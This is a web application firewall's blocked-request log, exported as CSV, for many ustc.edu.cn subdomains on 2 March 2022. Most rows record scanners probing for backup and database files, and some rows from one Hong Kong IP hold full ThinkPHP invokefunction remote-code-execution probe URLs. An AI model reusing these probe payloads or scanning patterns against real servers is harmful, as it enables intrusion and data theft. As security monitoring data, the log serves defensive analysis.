序号,攻击时间,规则编号,危害等级,源IP地址,地理位置,数据长度,源端口,目的端口,拦截方式,HTTP类型,URL
199,2022/3/2 10:00,1400001,中,116.255.179.186,中国 河南 郑州,297,1992,80,拦截,HEAD,http://micro.ustc.edu.cn/mysqldata.bak
200,2022/3/2 10:00,1400001,中,116.255.179.186,中国 河南 郑州,293,5168,80,拦截,HEAD,http://micro.ustc.edu.cn/HYTop.mdb
201,2022/3/2 10:00,1400001,中,116.255.179.186,中国 河南 郑州,292,8650,80,拦截,HEAD,http://micro.ustc.edu.cn/data.bak
212,2022/3/2 10:01,1950001,低,116.255.179.186,中国 河南 郑州,292,63314,80,拦截,HEAD,http://micro.ustc.edu.cn/0511.rar
215,2022/3/2 10:01,1950001,低,116.255.179.186,中国 河南 郑州,292,4918,80,拦截,HEAD,http://micro.ustc.edu.cn/1007.rar
220,2022/3/2 10:01,1950001,低,116.255.179.186,中国 河南 郑州,296,11938,80,拦截,HEAD,http://micro.ustc.edu.cn/20210403.rar
221,2022/3/2 10:01,1950001,低,116.255.179.186,中国 河南 郑州,296,17242,80,拦截,HEAD,http://micro.ustc.edu.cn/20210817.rar
599,2022/3/2 10:41,1400001,中,116.255.179.186,中国 河南 郑州,295,47096,80,拦截,HEAD,http://kyb.ustc.edu.cn/mysqldata.bak
600,2022/3/2 10:41,1400001,中,116.255.179.186,中国 河南 郑州,291,48912,80,拦截,HEAD,http://kyb.ustc.edu.cn/HYTop.mdb
601,2022/3/2 10:41,1400001,中,116.255.179.186,中国 河南 郑州,290,50130,80,拦截,HEAD,http://kyb.ustc.edu.cn/data.bak
640,2022/3/2 10:49,1400001,中,216.118.229.210,中国 香港  ,307,12512,80,拦截,HEAD,http://www.quantum2011.org/wwwquantum2011org.mdb
641,2022/3/2 10:49,1400001,中,216.118.229.210,中国 香港  ,309,12226,80,拦截,HEAD,http://www.quantum2011.org/www.quantum2011.org.mdb
642,2022/3/2 10:49,1400001,中,216.118.229.210,中国 香港  ,301,12310,80,拦截,HEAD,http://www.quantum2011.org/quantum2011.mdb
643,2022/3/2 10:49,1400001,中,216.118.229.210,中国 香港  ,305,12782,80,拦截,HEAD,http://www.quantum2011.org/quantum2011.org.mdb
644,2022/3/2 10:49,1400001,中,216.118.229.210,中国 香港  ,305,13002,80,拦截,HEAD,http://www.quantum2011.org/quantum2011_org.mdb
645,2022/3/2 10:49,1400001,中,216.118.229.210,中国 香港  ,304,12878,80,拦截,HEAD,http://www.quantum2011.org/quantum2011org.mdb
646,2022/3/2 10:49,1400001,中,216.118.229.210,中国 香港  ,309,13112,80,拦截,HEAD,http://www.quantum2011.org/www_quantum2011_org.mdb
763,2022/3/2 11:27,1400001,中,116.255.179.186,中国 河南 郑州,304,60862,80,拦截,HEAD,http://microseismic.ustc.edu.cn/mysqldata.bak
764,2022/3/2 11:27,1400001,中,116.255.179.186,中国 河南 郑州,300,61770,80,拦截,HEAD,http://microseismic.ustc.edu.cn/HYTop.mdb
765,2022/3/2 11:27,1400001,中,116.255.179.186,中国 河南 郑州,299,63048,80,拦截,HEAD,http://microseismic.ustc.edu.cn/data.bak
770,2022/3/2 11:27,1950001,低,116.255.179.186,中国 河南 郑州,299,23484,80,拦截,HEAD,http://microseismic.ustc.edu.cn/1211.rar
771,2022/3/2 11:27,1950001,低,116.255.179.186,中国 河南 郑州,299,23680,80,拦截,HEAD,http://microseismic.ustc.edu.cn/1228.rar
772,2022/3/2 11:27,1950001,低,116.255.179.186,中国 河南 郑州,303,24164,80,拦截,HEAD,http://microseismic.ustc.edu.cn/20210117.rar
773,2022/3/2 11:27,1950001,低,116.255.179.186,中国 河南 郑州,303,25318,80,拦截,HEAD,http://microseismic.ustc.edu.cn/20210408.rar
774,2022/3/2 11:27,1950001,低,116.255.179.186,中国 河南 郑州,303,27260,80,拦截,HEAD,http://microseismic.ustc.edu.cn/20210921.rar
775,2022/3/2 11:27,1950001,低,116.255.179.186,中国 河南 郑州,303,29318,80,拦截,HEAD,http://microseismic.ustc.edu.cn/20210218.zip
886,2022/3/2 13:11,1400001,中,116.255.179.186,中国 河南 郑州,296,12986,80,拦截,HEAD,http://mine.ustc.edu.cn/mysqldata.bak
887,2022/3/2 13:12,1400001,中,116.255.179.186,中国 河南 郑州,292,22124,80,拦截,HEAD,http://mine.ustc.edu.cn/HYTop.mdb
888,2022/3/2 13:12,1400001,中,116.255.179.186,中国 河南 郑州,291,31420,80,拦截,HEAD,http://mine.ustc.edu.cn/data.bak
889,2022/3/2 13:13,1950001,低,116.255.179.186,中国 河南 郑州,294,30716,80,拦截,HEAD,http://mine.ustc.edu.cn/iiiiiii.rar
890,2022/3/2 13:13,1950001,低,116.255.179.186,中国 河南 郑州,293,34468,80,拦截,HEAD,http://mine.ustc.edu.cn/nnnnnn.rar
892,2022/3/2 13:13,1950001,低,116.255.179.186,中国 河南 郑州,296,36146,80,拦截,HEAD,http://mine.ustc.edu.cn/ppppppppp.rar
894,2022/3/2 13:13,1950001,低,116.255.179.186,中国 河南 郑州,291,39264,80,拦截,HEAD,http://mine.ustc.edu.cn/502.html
899,2022/3/2 13:14,1950001,低,116.255.179.186,中国 河南 郑州,291,7072,80,拦截,HEAD,http://mine.ustc.edu.cn/0313.zip
900,2022/3/2 13:15,1950001,低,116.255.179.186,中国 河南 郑州,291,13764,80,拦截,HEAD,http://mine.ustc.edu.cn/502.html
904,2022/3/2 13:23,1950001,低,116.255.179.186,中国 河南 郑州,291,42274,80,拦截,HEAD,http://mine.ustc.edu.cn/502.html
905,2022/3/2 13:23,1950001,低,116.255.179.186,中国 河南 郑州,291,51728,80,拦截,HEAD,http://mine.ustc.edu.cn/502.html
909,2022/3/2 13:27,1334081,高,45.196.126.158,中国 香港  ,202,41136,80,拦截,HEAD,http://sist.ustc.edu.cn/?s=index/%5Cthink%5CRequest/input&filter=phpinfo&data=1
910,2022/3/2 13:27,1334080,高,45.196.126.158,中国 香港  ,277,41142,80,拦截,HEAD,http://sist.ustc.edu.cn/index.php?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=77770123
911,2022/3/2 13:27,1334080,高,45.196.126.158,中国 香港  ,285,41162,80,拦截,HEAD,http://sist.ustc.edu.cn/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=0e728664f5ee5a8141bfdc0662515c4
912,2022/3/2 13:27,1334080,高,45.196.126.158,中国 香港  ,263,41164,80,拦截,HEAD,http://sist.ustc.edu.cn/index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=
913,2022/3/2 13:27,1334081,高,45.196.126.158,中国 香港  ,201,41174,80,拦截,HEAD,http://sist.ustc.edu.cn/?s=index/%5Cthink%5CRequest/input&filter=phpinfo&data=
914,2022/3/2 13:27,1334080,高,45.196.126.158,中国 香港  ,264,41132,80,拦截,HEAD,http://sist.ustc.edu.cn/index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1
915,2022/3/2 13:27,1334080,高,45.196.126.158,中国 香港  ,280,41176,80,拦截,HEAD,http://sist.ustc.edu.cn/%20index.php?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=77770123
916,2022/3/2 13:27,1334080,高,45.196.126.158,中国 香港  ,286,41134,80,拦截,HEAD,http://sist.ustc.edu.cn/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=0e728664f5ee5a8141bfdc0662515c45
917,2022/3/2 13:28,1400001,中,116.255.179.186,中国 河南 郑州,295,29258,80,拦截,HEAD,http://opt.ustc.edu.cn/mysqldata.bak
918,2022/3/2 13:28,1400001,中,116.255.179.186,中国 河南 郑州,291,30508,80,拦截,HEAD,http://opt.ustc.edu.cn/HYTop.mdb
919,2022/3/2 13:28,1400001,中,116.255.179.186,中国 河南 郑州,290,31408,80,拦截,HEAD,http://opt.ustc.edu.cn/data.bak
922,2022/3/2 13:28,1334080,高,45.196.126.158,中国 香港  ,288,25384,80,拦截,HEAD,http://cailab.ustc.edu.cn/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=0e728664f5ee5a8141bfdc0662515c45
923,2022/3/2 13:28,1334081,高,45.196.126.158,中国 香港  ,204,25382,80,拦截,HEAD,http://cailab.ustc.edu.cn/?s=index/%5Cthink%5CRequest/input&filter=phpinfo&data=1
924,2022/3/2 13:28,1334080,高,45.196.126.158,中国 香港  ,279,25390,80,拦截,HEAD,http://cailab.ustc.edu.cn/index.php?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=77770123
925,2022/3/2 13:28,1334080,高,45.196.126.158,中国 香港  ,266,25386,80,拦截,HEAD,http://cailab.ustc.edu.cn/index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1
926,2022/3/2 13:28,1334081,高,45.196.126.158,中国 香港  ,203,25416,80,拦截,HEAD,http://cailab.ustc.edu.cn/?s=index/%5Cthink%5CRequest/input&filter=phpinfo&data=
927,2022/3/2 13:28,1334080,高,45.196.126.158,中国 香港  ,287,25418,80,拦截,HEAD,http://cailab.ustc.edu.cn/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=0e728664f5ee5a8141bfdc0662515c4
928,2022/3/2 13:28,1334080,高,45.196.126.158,中国 香港  ,282,25402,80,拦截,HEAD,http://cailab.ustc.edu.cn/%20index.php?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=77770123
929,2022/3/2 13:28,1334080,高,45.196.126.158,中国 香港  ,265,25426,80,拦截,HEAD,http://cailab.ustc.edu.cn/index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=
936,2022/3/2 13:29,1950001,低,116.255.179.186,中国 河南 郑州,653,60222,80,拦截,HEAD,http://opt.ustc.edu.cn/20211101.rar
937,2022/3/2 13:29,1950001,低,116.255.179.186,中国 河南 郑州,653,61956,80,拦截,HEAD,http://opt.ustc.edu.cn/20210218.zip
938,2022/3/2 13:29,1950001,低,116.255.179.186,中国 河南 郑州,653,64816,80,拦截,HEAD,http://opt.ustc.edu.cn/20210808.zip
939,2022/3/2 13:29,1950001,低,116.255.179.186,中国 河南 郑州,653,65186,80,拦截,HEAD,http://opt.ustc.edu.cn/20210829.zip
940,2022/3/2 13:29,1950001,低,116.255.179.186,中国 河南 郑州,653,2316,80,拦截,HEAD,http://opt.ustc.edu.cn/20211229.zip
941,2022/3/2 13:29,1334081,高,45.196.126.158,中国 香港  ,210,42766,80,拦截,HEAD,http://english-icqd.ustc.edu.cn/?s=index/%5Cthink%5CRequest/input&filter=phpinfo&data=1
944,2022/3/2 13:30,1400001,中,116.255.179.186,中国 河南 郑州,302,7714,80,拦截,HEAD,http://orgchemlab.ustc.edu.cn/mysqldata.bak
945,2022/3/2 13:30,1400001,中,116.255.179.186,中国 河南 郑州,298,8482,80,拦截,HEAD,http://orgchemlab.ustc.edu.cn/HYTop.mdb
946,2022/3/2 13:30,1400001,中,116.255.179.186,中国 河南 郑州,297,9204,80,拦截,HEAD,http://orgchemlab.ustc.edu.cn/data.bak
947,2022/3/2 13:30,1950001,低,116.255.179.186,中国 河南 郑州,301,28856,80,拦截,HEAD,http://orgchemlab.ustc.edu.cn/20210316.rar
948,2022/3/2 13:30,1950001,低,116.255.179.186,中国 河南 郑州,301,29490,80,拦截,HEAD,http://orgchemlab.ustc.edu.cn/20210511.rar
949,2022/3/2 13:30,1950001,低,116.255.179.186,中国 河南 郑州,301,31710,80,拦截,HEAD,http://orgchemlab.ustc.edu.cn/20211201.rar
950,2022/3/2 13:30,1950001,低,116.255.179.186,中国 河南 郑州,301,33336,80,拦截,HEAD,http://orgchemlab.ustc.edu.cn/20210507.zip
952,2022/3/2 13:31,1950001,低,116.255.179.186,中国 河南 郑州,305,37878,80,拦截,HEAD,http://orgchemlab.ustc.edu.cn/ustc20210707.rar
958,2022/3/2 13:39,1334080,高,45.196.126.158,中国 香港  ,264,57086,80,拦截,HEAD,http://lstt.ustc.edu.cn/index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1
959,2022/3/2 13:39,1334080,高,45.196.126.158,中国 香港  ,263,57154,80,拦截,HEAD,http://lstt.ustc.edu.cn/index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=
960,2022/3/2 13:39,1334080,高,45.196.126.158,中国 香港  ,280,57156,80,拦截,HEAD,http://lstt.ustc.edu.cn/%20index.php?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=77770123
961,2022/3/2 13:39,1334081,高,45.196.126.158,中国 香港  ,202,57144,80,拦截,HEAD,http://lstt.ustc.edu.cn/?s=index/%5Cthink%5CRequest/input&filter=phpinfo&data=1
962,2022/3/2 13:39,1334080,高,45.196.126.158,中国 香港  ,286,57114,80,拦截,HEAD,http://lstt.ustc.edu.cn/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=0e728664f5ee5a8141bfdc0662515c45
963,2022/3/2 13:39,1334081,高,45.196.126.158,中国 香港  ,201,57160,80,拦截,HEAD,http://lstt.ustc.edu.cn/?s=index/%5Cthink%5CRequest/input&filter=phpinfo&data=
964,2022/3/2 13:39,1334080,高,45.196.126.158,中国 香港  ,285,57158,80,拦截,HEAD,http://lstt.ustc.edu.cn/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=0e728664f5ee5a8141bfdc0662515c4
965,2022/3/2 13:39,1334080,高,45.196.126.158,中国 香港  ,277,57092,80,拦截,HEAD,http://lstt.ustc.edu.cn/index.php?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=77770123
966,2022/3/2 13:40,1334080,高,45.196.126.158,中国 香港  ,277,33194,80,拦截,HEAD,http://mems.ustc.edu.cn/index.php?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=77770123
967,2022/3/2 13:40,1334080,高,45.196.126.158,中国 香港  ,280,33264,80,拦截,HEAD,http://mems.ustc.edu.cn/%20index.php?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=77770123
968,2022/3/2 13:40,1334080,高,45.196.126.158,中国 香港  ,263,33272,80,拦截,HEAD,http://mems.ustc.edu.cn/index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=
969,2022/3/2 13:40,1334080,高,45.196.126.158,中国 香港  ,264,33200,80,拦截,HEAD,http://mems.ustc.edu.cn/index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1
970,2022/3/2 13:40,1334081,高,45.196.126.158,中国 香港  ,202,33202,80,拦截,HEAD,http://mems.ustc.edu.cn/?s=index/%5Cthink%5CRequest/input&filter=phpinfo&data=1
971,2022/3/2 13:40,1334081,高,45.196.126.158,中国 香港  ,201,33270,80,拦截,HEAD,http://mems.ustc.edu.cn/?s=index/%5Cthink%5CRequest/input&filter=phpinfo&data=
975,2022/3/2 13:42,1400001,中,116.255.179.186,中国 河南 郑州,294,28056,80,拦截,HEAD,http://ot.ustc.edu.cn/mysqldata.bak
976,2022/3/2 13:42,1400001,中,116.255.179.186,中国 河南 郑州,290,31762,80,拦截,HEAD,http://ot.ustc.edu.cn/HYTop.mdb
977,2022/3/2 13:42,1400001,中,116.255.179.186,中国 河南 郑州,289,36468,80,拦截,HEAD,http://ot.ustc.edu.cn/data.bak
987,2022/3/2 13:45,1950001,低,116.255.179.186,中国 河南 郑州,289,61370,80,拦截,HEAD,http://ot.ustc.edu.cn/1003.rar
988,2022/3/2 13:45,1950001,低,116.255.179.186,中国 河南 郑州,289,62388,80,拦截,HEAD,http://ot.ustc.edu.cn/1021.rar
995,2022/3/2 13:57,1310018,中,183.111.122.107,韩国,259,57026,80,拦截,HEAD,http://owc.ustc.edu.cn/data/backup/database/tools.php
1001,2022/3/2 14:18,1400001,中,59.49.77.247,中国 山西 太原,270,27220,80,拦截,HEAD,http://www.job.ustc.edu.cn/HYTop.mdb
1004,2022/3/2 14:19,1400001,中,59.49.77.247,中国 山西 太原,266,30950,80,拦截,HEAD,http://job.ustc.edu.cn/HYTop.mdb
1030,2022/3/2 14:36,1310018,中,183.111.122.107,韩国,259,15300,80,拦截,HEAD,http://ess.ustc.edu.cn/data/backup/database/tools.php
1034,2022/3/2 14:36,1310018,中,183.111.122.107,韩国,259,2812,80,拦截,HEAD,http://lt.ustc.edu.cn/data/backup/database/tools.php
1107,2022/3/2 15:31,1400001,中,101.124.0.54,中国 北京 北京,285,12116,80,拦截,HEAD,http://ustc.edu.cn/mysqldata.bak
1108,2022/3/2 15:31,1400001,中,101.124.0.54,中国 北京 北京,281,17004,80,拦截,HEAD,http://ustc.edu.cn/HYTop.mdb
1109,2022/3/2 15:31,1400001,中,101.124.0.54,中国 北京 北京,280,20642,80,拦截,HEAD,http://ustc.edu.cn/data.bak
1111,2022/3/2 15:33,1950001,低,101.124.0.54,中国 北京 北京,284,51836,80,拦截,HEAD,http://ustc.edu.cn/20210915.rar
1112,2022/3/2 15:33,1950001,低,101.124.0.54,中国 北京 北京,284,53732,80,拦截,HEAD,http://ustc.edu.cn/20211015.rar
1113,2022/3/2 15:33,1950001,低,101.124.0.54,中国 北京 北京,284,57586,80,拦截,HEAD,http://ustc.edu.cn/20211122.rar
1114,2022/3/2 15:33,1950001,低,101.124.0.54,中国 北京 北京,284,59492,80,拦截,HEAD,http://ustc.edu.cn/20210111.zip
1115,2022/3/2 15:33,1950001,低,101.124.0.54,中国 北京 北京,284,59724,80,拦截,HEAD,http://ustc.edu.cn/20210119.zip
1116,2022/3/2 15:34,1950001,低,101.124.0.54,中国 北京 北京,284,7092,80,拦截,HEAD,http://ustc.edu.cn/20210806.zip
1117,2022/3/2 15:34,1950001,低,101.124.0.54,中国 北京 北京,288,18262,80,拦截,HEAD,http://ustc.edu.cn/ustc20210403.rar
1118,2022/3/2 15:34,1400001,中,101.124.0.54,中国 北京 北京,293,55696,80,拦截,HEAD,http://ustcnet.ustc.edu.cn/mysqldata.bak
1119,2022/3/2 15:35,1400001,中,101.124.0.54,中国 北京 北京,289,58042,80,拦截,HEAD,http://ustcnet.ustc.edu.cn/HYTop.mdb
1120,2022/3/2 15:35,1400001,中,101.124.0.54,中国 北京 北京,288,60048,80,拦截,HEAD,http://ustcnet.ustc.edu.cn/data.bak
1123,2022/3/2 15:36,1950001,低,101.124.0.54,中国 北京 北京,288,42376,80,拦截,HEAD,http://ustcnet.ustc.edu.cn/0428.rar
1124,2022/3/2 15:36,1950001,低,101.124.0.54,中国 北京 北京,288,48214,80,拦截,HEAD,http://ustcnet.ustc.edu.cn/1004.rar
1125,2022/3/2 15:36,1950001,低,101.124.0.54,中国 北京 北京,288,48966,80,拦截,HEAD,http://ustcnet.ustc.edu.cn/1028.rar
1126,2022/3/2 15:36,1950001,低,101.124.0.54,中国 北京 北京,288,49774,80,拦截,HEAD,http://ustcnet.ustc.edu.cn/1118.rar
1127,2022/3/2 15:36,1950001,低,101.124.0.54,中国 北京 北京,292,54244,80,拦截,HEAD,http://ustcnet.ustc.edu.cn/20210404.rar
1128,2022/3/2 15:36,1950001,低,101.124.0.54,中国 北京 北京,292,56404,80,拦截,HEAD,http://ustcnet.ustc.edu.cn/20210620.rar
1195,2022/3/2 16:16,1400001,中,101.124.0.54,中国 北京 北京,290,1374,80,拦截,HEAD,http://utfd.ustc.edu.cn/mysqldata.bak
1196,2022/3/2 16:16,1400001,中,101.124.0.54,中国 北京 北京,286,3150,80,拦截,HEAD,http://utfd.ustc.edu.cn/HYTop.mdb
1197,2022/3/2 16:16,1400001,中,101.124.0.54,中国 北京 北京,285,4940,80,拦截,HEAD,http://utfd.ustc.edu.cn/data.bak
1198,2022/3/2 16:16,1400001,中,116.255.179.186,中国 河南 郑州,295,55674,80,拦截,HEAD,http://pas.ustc.edu.cn/mysqldata.bak
1199,2022/3/2 16:17,1400001,中,116.255.179.186,中国 河南 郑州,291,58832,80,拦截,HEAD,http://pas.ustc.edu.cn/HYTop.mdb
1200,2022/3/2 16:17,1400001,中,116.255.179.186,中国 河南 郑州,290,62046,80,拦截,HEAD,http://pas.ustc.edu.cn/data.bak
1201,2022/3/2 16:17,1950001,低,101.124.0.54,中国 北京 北京,285,38822,80,拦截,HEAD,http://utfd.ustc.edu.cn/0811.rar
1202,2022/3/2 16:17,1950001,低,101.124.0.54,中国 北京 北京,289,42256,80,拦截,HEAD,http://utfd.ustc.edu.cn/20210124.rar
1203,2022/3/2 16:17,1950001,低,101.124.0.54,中国 北京 北京,289,42110,80,拦截,HEAD,http://utfd.ustc.edu.cn/20210120.rar
1204,2022/3/2 16:17,1950001,低,101.124.0.54,中国 北京 北京,289,43576,80,拦截,HEAD,http://utfd.ustc.edu.cn/20210316.rar
1205,2022/3/2 16:17,1950001,低,101.124.0.54,中国 北京 北京,289,43952,80,拦截,HEAD,http://utfd.ustc.edu.cn/20210401.rar
1206,2022/3/2 16:17,1950001,低,101.124.0.54,中国 北京 北京,289,51616,80,拦截,HEAD,http://utfd.ustc.edu.cn/20210106.zip
1208,2022/3/2 16:18,1950001,低,116.255.179.186,中国 河南 郑州,290,63992,80,拦截,HEAD,http://pas.ustc.edu.cn/0929.rar
1209,2022/3/2 16:18,1950001,低,116.255.179.186,中国 河南 郑州,290,64256,80,拦截,HEAD,http://pas.ustc.edu.cn/1003.rar
1210,2022/3/2 16:18,1950001,低,116.255.179.186,中国 河南 郑州,294,4408,80,拦截,HEAD,http://pas.ustc.edu.cn/20210205.rar
1211,2022/3/2 16:18,1950001,低,116.255.179.186,中国 河南 郑州,294,6676,80,拦截,HEAD,http://pas.ustc.edu.cn/20210327.rar
1212,2022/3/2 16:18,1950001,低,116.255.179.186,中国 河南 郑州,294,9462,80,拦截,HEAD,http://pas.ustc.edu.cn/20210610.rar
1213,2022/3/2 16:18,1950001,低,116.255.179.186,中国 河南 郑州,298,31622,80,拦截,HEAD,http://pas.ustc.edu.cn/ustc20210111.rar
1214,2022/3/2 16:18,1950001,低,116.255.179.186,中国 河南 郑州,298,33948,80,拦截,HEAD,http://pas.ustc.edu.cn/ustc20210321.rar
1262,2022/3/2 16:43,1400001,中,101.124.0.54,中国 北京 北京,291,3846,80,拦截,HEAD,http://sklfs.ustc.edu.cn/mysqldata.bak
1263,2022/3/2 16:43,1400001,中,101.124.0.54,中国 北京 北京,287,6100,80,拦截,HEAD,http://sklfs.ustc.edu.cn/HYTop.mdb
1264,2022/3/2 16:43,1400001,中,101.124.0.54,中国 北京 北京,286,8926,80,拦截,HEAD,http://sklfs.ustc.edu.cn/data.bak
1289,2022/3/2 16:54,1400001,中,101.124.0.54,中国 北京 北京,292,62612,80,拦截,HEAD,http://sklpde.ustc.edu.cn/mysqldata.bak
1290,2022/3/2 16:54,1400001,中,101.124.0.54,中国 北京 北京,288,64245,80,拦截,HEAD,http://sklpde.ustc.edu.cn/HYTop.mdb
1291,2022/3/2 16:54,1400001,中,101.124.0.54,中国 北京 北京,287,1972,80,拦截,HEAD,http://sklpde.ustc.edu.cn/data.bak
1292,2022/3/2 16:54,1950001,低,101.124.0.54,中国 北京 北京,287,43562,80,拦截,HEAD,http://sklpde.ustc.edu.cn/0810.rar
1293,2022/3/2 16:55,1950001,低,101.124.0.54,中国 北京 北京,287,46624,80,拦截,HEAD,http://sklpde.ustc.edu.cn/1118.rar
1294,2022/3/2 16:55,1950001,低,101.124.0.54,中国 北京 北京,287,47010,80,拦截,HEAD,http://sklpde.ustc.edu.cn/1215.rar
1295,2022/3/2 16:55,1950001,低,101.124.0.54,中国 北京 北京,291,48738,80,拦截,HEAD,http://sklpde.ustc.edu.cn/20210307.rar
1296,2022/3/2 16:55,1950001,低,101.124.0.54,中国 北京 北京,291,48906,80,拦截,HEAD,http://sklpde.ustc.edu.cn/20210316.rar
1297,2022/3/2 16:55,1950001,低,101.124.0.54,中国 北京 北京,291,50544,80,拦截,HEAD,http://sklpde.ustc.edu.cn/20210608.rar
1298,2022/3/2 16:55,1950001,低,101.124.0.54,中国 北京 北京,291,51570,80,拦截,HEAD,http://sklpde.ustc.edu.cn/20210723.rar
